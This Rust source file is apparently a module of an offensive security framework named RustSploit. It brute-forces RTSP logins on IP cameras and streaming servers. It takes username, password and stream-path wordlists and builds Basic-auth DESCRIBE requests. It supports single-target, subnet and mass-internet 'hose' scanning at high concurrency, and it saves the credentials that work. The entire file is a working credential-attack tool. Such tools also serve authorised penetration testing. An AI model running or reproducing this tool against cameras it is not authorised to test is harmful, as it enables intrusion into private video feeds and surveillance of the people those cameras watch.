use anyhow::{anyhow, Result};
use base64::engine::general_purpose::STANDARD as Base64;
use base64::Engine as _;
use colored::*;
use std::{
    net::{IpAddr, SocketAddr},
    sync::Arc,
    time::Duration,
};
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    time::timeout,
};

use crate::modules::creds::utils::{
    generate_combos, is_mass_scan_target, is_subnet_target, run_bruteforce, run_mass_scan,
    run_subnet_bruteforce, BruteforceConfig, LoginResult, MassScanConfig, SubnetScanConfig,
};
use crate::utils::{
    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_output_file,
    cfg_prompt_port, cfg_prompt_yes_no, load_lines, normalize_target,
};

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "RTSP Brute Force".to_string(),
        description: "Brute-force RTSP authentication for IP cameras and streaming devices. Supports advanced RTSP commands, custom headers, path brute-forcing, and subnet/mass scanning.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

const CONNECT_TIMEOUT_MS: u64 = 3000;

fn display_banner() {
    crate::mprintln!(
        "{}",
        "╔═══════════════════════════════════════════════════════════╗".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Advanced RTSP Brute Force Module                        ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   IP Camera and Streaming Server Credential Testing       ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Supports path enumeration and custom headers            ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Modes: Single Target & Mass Scan (Hose)                 ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "╚═══════════════════════════════════════════════════════════╝".cyan()
    );
    crate::mprintln!();
}

/// Main entry point for the advanced RTSP brute force module.
pub async fn run(target: &str) -> Result<()> {
    display_banner();

    crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());

    // --- Mass Scan Mode ---
    if is_mass_scan_target(target) {
        crate::mprintln!("{}", "[*] Mode: Mass Scan / Hose".yellow());

        let usernames_file =
            cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file =
            cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let paths_file =
            cfg_prompt_existing_file("paths_file", "RTSP paths file (empty for none/root)").await?;
        let users = Arc::new(load_lines(&usernames_file)?);
        let passes = Arc::new(load_lines(&passwords_file)?);
        let mut paths = load_lines(&paths_file)?;
        if paths.is_empty() {
            paths.push("".to_string());
        }
        let paths = Arc::new(paths);
        if users.is_empty() || passes.is_empty() {
            return Err(anyhow!("Wordlists cannot be empty"));
        }

        let cfg = MassScanConfig {
            protocol_name: "RTSP",
            default_port: 554,
            state_file: "rtsp_hose_state.log",
            default_output: "rtsp_mass_results.txt",
            default_concurrency: 500,
        };

        return run_mass_scan(target, cfg, move |ip: IpAddr, port: u16| {
            let users = users.clone();
            let passes = passes.clone();
            let paths = paths.clone();
            async move {
                if !crate::utils::tcp_port_open(ip, port, std::time::Duration::from_secs(3)).await {
                    return None;
                }

                let sa = SocketAddr::new(ip, port);
                let empty_headers: Vec<String> = Vec::new();
                for path in paths.iter() {
                    for user in users.iter() {
                        for pass in passes.iter() {
                            let addrs = [sa];
                            let res = try_rtsp_login(
                                &addrs,
                                &sa.to_string(),
                                user,
                                pass,
                                path,
                                Some("DESCRIBE"),
                                &empty_headers,
                            )
                            .await;
                            match res {
                                Ok(true) => {
                                    let now = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                                    let line =
                                        format!("[{}] {}:{}:{}:{}\n", now, ip, port, user, pass);
                                    crate::mprintln!(
                                        "\r{}",
                                        format!(
                                            "[+] FOUND: {}:{} -> {}:{} [path={}]",
                                            ip, port, user, pass, path
                                        )
                                        .green()
                                        .bold()
                                    );
                                    return Some(line);
                                }
                                Err(e) => {
                                    let err_str = e.to_string().to_lowercase();
                                    if err_str.contains("refused")
                                        || err_str.contains("timeout")
                                        || err_str.contains("reset")
                                    {
                                        return None;
                                    }
                                }
                                _ => {}
                            }
                        }
                    }
                }
                None
            }
        })
        .await;
    }

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        crate::mprintln!("{}", "[*] Mode: Subnet Scan".cyan());
        return run_subnet_scan(target).await;
    }

    // --- Standard Single-Target Logic ---

    let port: u16 = cfg_prompt_port("port", "RTSP Port", 554).await?;

    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;

    let concurrency =
        cfg_prompt_int_range("concurrency", "Max concurrent tasks", 10, 1, 10000).await? as usize;

    let stop_on_success =
        cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
    let save_path = if save_results {
        Some(cfg_prompt_output_file("output_file", "Output file", "rtsp_results.txt").await?)
    } else {
        None
    };
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let combo_mode = cfg_prompt_yes_no(
        "combo_mode",
        "Combination mode? (try every pass with every user)",
        false,
    )
    .await?;

    let advanced_mode = cfg_prompt_yes_no(
        "advanced_mode",
        "Use advanced RTSP commands/headers (DESCRIBE + custom headers)?",
        false,
    )
    .await?;
    let mut advanced_headers: Vec<String> = Vec::new();
    let advanced_command = if advanced_mode {
        let method = cfg_prompt_default(
            "rtsp_method",
            "RTSP method to use (e.g. DESCRIBE)",
            "DESCRIBE",
        )
        .await?;
        if cfg_prompt_yes_no(
            "load_headers_file",
            "Load extra RTSP headers from a file?",
            false,
        )
        .await?
        {
            let headers_path =
                cfg_prompt_existing_file("headers_file", "Path to RTSP headers file").await?;
            advanced_headers = load_lines(&headers_path)?;
        }
        Some(method)
    } else {
        None
    };
    let advanced_headers = Arc::new(advanced_headers);

    // Extract RTSP path if present (e.g., rtsp://host:port/path -> path)
    let implicit_path = extract_rtsp_path(target);

    // Normalize target and add port if needed
    let target_normalized = if target.starts_with("rtsp://") {
        target
            .strip_prefix("rtsp://")
            .unwrap_or(target)
            .split('/')
            .next()
            .unwrap_or(target)
    } else {
        target.split('/').next().unwrap_or(target)
    };

    let normalized = normalize_target(target_normalized)?;
    let target_host = if normalized.contains(':') {
        // Already has port — extract host part
        normalized
            .rsplit_once(':')
            .map(|(h, _)| h)
            .unwrap_or(&normalized)
            .to_string()
    } else {
        normalized.clone()
    };

    let users = load_lines(&usernames_file)?;
    if users.is_empty() {
        crate::mprintln!("[!] Username wordlist is empty. Exiting.");
        return Ok(());
    }

    let pass_lines = load_lines(&passwords_file)?;
    if pass_lines.is_empty() {
        crate::mprintln!("[!] Password wordlist is empty. Exiting.");
        return Ok(());
    }

    let brute_force_paths = cfg_prompt_yes_no(
        "brute_force_paths",
        "Brute force possible RTSP paths (e.g. /stream /live)?",
        false,
    )
    .await?;
    let mut paths = if brute_force_paths {
        let paths_file = cfg_prompt_existing_file("paths_file", "Path to RTSP paths file").await?;
        load_lines(&paths_file)?
    } else {
        vec!["".to_string()]
    };
    if paths.is_empty() {
        crate::mprintln!("[!] RTSP paths list is empty. Falling back to default root path.");
        paths.push(String::new());
    }
    if let Some(p) = implicit_path {
        if !paths.iter().any(|existing| existing == &p) {
            paths.insert(0, p);
        }
    }

    let addr = format!("{}:{}", target_host, port);
    let resolved_addrs = match resolve_targets(&addr).await {
        Ok(addrs) => Arc::new(addrs),
        Err(e) => {
            crate::meprintln!("[!] Failed to resolve '{}': {}", addr, e);
            return Err(e);
        }
    };

    let combos = generate_combos(&users, &pass_lines, combo_mode);
    crate::mprintln!(
        "{}",
        format!(
            "[*] {} credential pair(s) x {} path(s) = {} total attempts",
            combos.len(),
            paths.len(),
            combos.len() * paths.len()
        )
        .cyan()
    );

    // Loop over each RTSP path, running the bruteforce engine per path.
    // This preserves the engine's clean (user, pass) API while covering
    // the RTSP-specific path dimension.
    let mut all_found: Vec<(String, String, String, String)> = Vec::new();

    for path in &paths {
        let path_display = if path.is_empty() {
            "/ (root)"
        } else {
            path.as_str()
        };
        crate::mprintln!("\n{}", format!("[*] Testing path: {}", path_display).cyan());

        let path_c = path.clone();
        let addrs_c = resolved_addrs.clone();
        let headers_c = advanced_headers.clone();
        let command_c = advanced_command.clone();

        let try_login = move |t: String, p: u16, user: String, pass: String| {
            let addrs = addrs_c.clone();
            let path = path_c.clone();
            let headers = headers_c.clone();
            let command = command_c.clone();
            let display_addr = format!("{}:{}", t, p);
            async move {
                match try_rtsp_login(
                    addrs.as_slice(),
                    &display_addr,
                    &user,
                    &pass,
                    &path,
                    command.as_deref(),
                    &headers,
                )
                .await
                {
                    Ok(true) => LoginResult::Success,
                    Ok(false) => LoginResult::AuthFailed,
                    Err(e) => {
                        let msg = e.to_string().to_lowercase();
                        let retryable = !msg.contains("401") && !msg.contains("403");
                        LoginResult::Error {
                            message: e.to_string(),
                            retryable,
                        }
                    }
                }
            }
        };

        let result = run_bruteforce(
            &BruteforceConfig {
                target: target_host.clone(),
                port,
                concurrency,
                stop_on_success,
                verbose,
                delay_ms: 10,
                max_retries: 2,
                service_name: "rtsp",
                source_module: "creds/generic/rtsp_bruteforce",
            },
            combos.clone(),
            try_login,
        )
        .await?;

        let path_label = if path.is_empty() {
            "NO_PATH".to_string()
        } else {
            path.clone()
        };
        for (host, user, pass) in &result.found {
            all_found.push((host.clone(), user.clone(), pass.clone(), path_label.clone()));
        }

        // If stop_on_success and we found something on this path, skip remaining paths
        if stop_on_success && !result.found.is_empty() {
            crate::mprintln!(
                "{}",
                "[*] Credentials found and stop_on_success enabled — skipping remaining paths."
                    .yellow()
            );
            break;
        }
    }

    // Final summary across all paths
    if all_found.is_empty() {
        crate::mprintln!(
            "{}",
            "[-] No credentials found (with these paths).".yellow()
        );
    } else {
        crate::mprintln!(
            "\n{}",
            format!(
                "[+] Found {} valid credential(s) across all paths:",
                all_found.len()
            )
            .green()
            .bold()
        );
        for (host, user, pass, path) in &all_found {
            crate::mprintln!("    {} -> {}:{} [path={}]", host, user, pass, path);
        }

        if let Some(ref path) = save_path {
            let filename = crate::utils::get_filename_in_current_dir(path);
            {
                use std::io::Write;
                use std::os::unix::fs::OpenOptionsExt;
                let mut opts = std::fs::OpenOptions::new();
                opts.write(true).create(true).truncate(true);
                opts.mode(0o600);
                if let Ok(mut file) = opts.open(&filename) {
                    for (host, user, pass, path) in &all_found {
                        if let Err(e) = writeln!(file, "{} -> {}:{} [path={}]", host, user, pass, path) { crate::meprintln!("[!] Write error: {}", e); }
                    }
                    crate::mprintln!("[+] Results saved to '{}'", filename.display());
                }
            }
        }
    }

    Ok(())
}

/// Run subnet scan using the generic subnet bruteforce engine.
/// Loops over RTSP paths externally, running `run_subnet_bruteforce` per path.
async fn run_subnet_scan(target: &str) -> Result<()> {
    let port: u16 = cfg_prompt_port("port", "RTSP Port", 554).await?;
    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
    let paths_file =
        cfg_prompt_existing_file("paths_file", "RTSP paths file (empty for none/root)").await?;
    let users = load_lines(&usernames_file)?;
    let pass_lines = load_lines(&passwords_file)?;
    let mut paths = load_lines(&paths_file)?;
    if paths.is_empty() {
        paths.push("".to_string());
    }
    if users.is_empty() || pass_lines.is_empty() {
        return Err(anyhow!("Wordlists cannot be empty"));
    }

    let concurrency =
        cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000).await? as usize;
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let output_file = cfg_prompt_output_file(
        "output_file",
        "Output result file",
        "rtsp_subnet_results.txt",
    )
    .await?;

    for path in &paths {
        let path_display = if path.is_empty() {
            "/ (root)"
        } else {
            path.as_str()
        };
        crate::mprintln!(
            "{}",
            format!("[*] Subnet scan — RTSP path: {}", path_display).cyan()
        );

        let path_c = path.clone();
        let empty_headers: Arc<Vec<String>> = Arc::new(Vec::new());

        run_subnet_bruteforce(
            target,
            port,
            users.clone(),
            pass_lines.clone(),
            &SubnetScanConfig {
                concurrency,
                verbose,
                output_file: output_file.clone(),
                service_name: "rtsp",
                source_module: "creds/generic/rtsp_bruteforce",
                skip_tcp_check: false,
            },
            move |ip: IpAddr, port: u16, user: String, pass: String| {
                let path = path_c.clone();
                let headers = empty_headers.clone();
                async move {
                    let sa = SocketAddr::new(ip, port);
                    let addrs = [sa];
                    match try_rtsp_login(
                        &addrs,
                        &sa.to_string(),
                        &user,
                        &pass,
                        &path,
                        Some("DESCRIBE"),
                        &headers,
                    )
                    .await
                    {
                        Ok(true) => LoginResult::Success,
                        Ok(false) => LoginResult::AuthFailed,
                        Err(e) => {
                            let msg = e.to_string().to_lowercase();
                            // Connection errors are retryable; auth errors are not
                            let retryable = msg.contains("refused")
                                || msg.contains("timeout")
                                || msg.contains("reset")
                                || msg.contains("connection");
                            LoginResult::Error {
                                message: e.to_string(),
                                retryable,
                            }
                        }
                    }
                }
            },
        )
        .await?;
    }

    Ok(())
}

/// Resolve a host:port (literal v4/v6 or DNS) into all possible SocketAddrs.
async fn resolve_targets(addr: &str) -> Result<Vec<SocketAddr>> {
    // 1) If it's a literal SocketAddr, return it directly
    if let Ok(sa) = addr.parse::<SocketAddr>() {
        return Ok(vec![sa]);
    }

    // 2) Split into host / port
    let (host, port) = if let Some((h, p)) = addr.rsplit_once(':') {
        (h.to_string(), p.parse().unwrap_or(554))
    } else {
        (addr.to_string(), 554)
    };

    // 3) Clean any nested brackets and format bracketed IPv6 or plain host
    let host_clean = host.trim_matches(|c| c == '[' || c == ']').to_string();
    let host_port = if host_clean.contains(':') {
        format!("[{}]:{}", host_clean, port)
    } else {
        format!("{}:{}", host_clean, port)
    };

    // 4) DNS lookup (handles A + AAAA)
    let addrs = tokio::net::lookup_host(host_port.clone())
        .await
        .map_err(|e| anyhow!("DNS lookup '{}': {}", host_port, e))?
        .collect::<Vec<_>>();

    if addrs.is_empty() {
        Err(anyhow!("No addresses found for '{}'", host_port))
    } else {
        Ok(addrs)
    }
}

/// Attempt RTSP login, trying each resolved address until one succeeds or all fail.
async fn try_rtsp_login(
    addrs: &[SocketAddr],
    addr_display: &str,
    user: &str,
    pass: &str,
    path: &str,
    method: Option<&str>,
    extra_headers: &[String],
) -> Result<bool> {
    let mut last_err = None;
    let mut stream = None;
    let mut connected_sa: Option<SocketAddr> = None;

    // Try each candidate address
    for sa in addrs {
        match timeout(
            Duration::from_millis(CONNECT_TIMEOUT_MS),
            TcpStream::connect(*sa),
        )
        .await
        {
            Ok(Ok(s)) => {
                stream = Some(s);
                connected_sa = Some(*sa);
                break;
            }
            Ok(Err(e)) => {
                last_err = Some(e);
                continue;
            }
            Err(_) => {
                last_err = Some(std::io::Error::new(
                    std::io::ErrorKind::TimedOut,
                    "Connect timeout",
                ));
                continue;
            }
        }
    }

    // Unwrap the successful connection and SocketAddr
    let (mut stream, sa) = match (stream, connected_sa) {
        (Some(s), Some(sa)) => (s, sa),
        _ => {
            return Err(anyhow!(
                "All connection attempts to {} failed: {}",
                addr_display,
                last_err.map(|e| e.to_string()).unwrap_or_default()
            ))
        }
    };

    // Build a proper host:port string for the RTSP URI, handling IPv6 correctly
    let ip_str = sa.ip().to_string();
    let host_for_uri = if ip_str.contains(':') {
        format!("[{}]:{}", ip_str, sa.port())
    } else {
        format!("{}:{}", ip_str, sa.port())
    };

    let rtsp_method = method.unwrap_or("OPTIONS");
    let path_str = if path.is_empty() { "" } else { path };
    let credentials = Base64.encode(format!("{}:{}", user, pass));

    let mut request = format!(
        "{method} rtsp://{host}/{path} RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {auth}\r\n",
        method = rtsp_method,
        host = host_for_uri,
        path = path_str.trim_start_matches('/'),
        auth = credentials,
    );

    for header in extra_headers {
        request.push_str(header);
        if !header.ends_with("\r\n") {
            request.push_str("\r\n");
        }
    }
    request.push_str("\r\n");

    stream.write_all(request.as_bytes()).await?;
    let mut buffer = [0u8; 2048];
    // Add Read timeout
    let n = match timeout(
        Duration::from_millis(CONNECT_TIMEOUT_MS),
        stream.read(&mut buffer),
    )
    .await
    {
        Ok(Ok(n)) => n,
        Ok(Err(e)) => return Err(e.into()),
        Err(_) => return Err(anyhow!("Read timeout")),
    };

    if n == 0 {
        return Err(anyhow!(
            "{}: server closed connection unexpectedly.",
            addr_display
        ));
    }
    let response = String::from_utf8_lossy(&buffer[..n]);

    if response.contains("200 OK") {
        Ok(true)
    } else if response.contains("401") || response.contains("403") {
        Ok(false)
    } else {
        // Some cameras might return 404 if path is wrong but still authorized?
        // Or 400 Bad Request?
        // Safest is to treat anything not 200 as fail, but maybe check for specifc auth fail codes.
        // If we get 404, the creds might be valid but path invalid.
        // But without positive valid signal, we assume fail.
        Err(anyhow!(
            "{}: unexpected RTSP response: {}",
            addr_display,
            response.lines().next().unwrap_or("")
        ))
    }
}

/// Extract RTSP path from target string (e.g., rtsp://host:port/path -> Some("/path"))
/// Returns None if no path is present or if path is just "/"
fn extract_rtsp_path(target: &str) -> Option<String> {
    let trimmed = target.trim();

    // Remove rtsp:// scheme if present
    let without_scheme = trimmed.strip_prefix("rtsp://").unwrap_or(trimmed);

    // Split on first '/' to separate host:port from path
    if let Some((_, path)) = without_scheme.split_once('/') {
        // Remove query strings and fragments
        let clean_path = path
            .split(|c| c == '?' || c == '#')
            .next()
            .unwrap_or_default()
            .trim();

        if clean_path.is_empty() || clean_path == "/" {
            None
        } else {
            // Ensure path starts with '/'
            let mut final_path = clean_path.to_string();
            if !final_path.starts_with('/') {
                final_path.insert(0, '/');
            }
            Some(final_path)
        }
    } else {
        None
    }
}
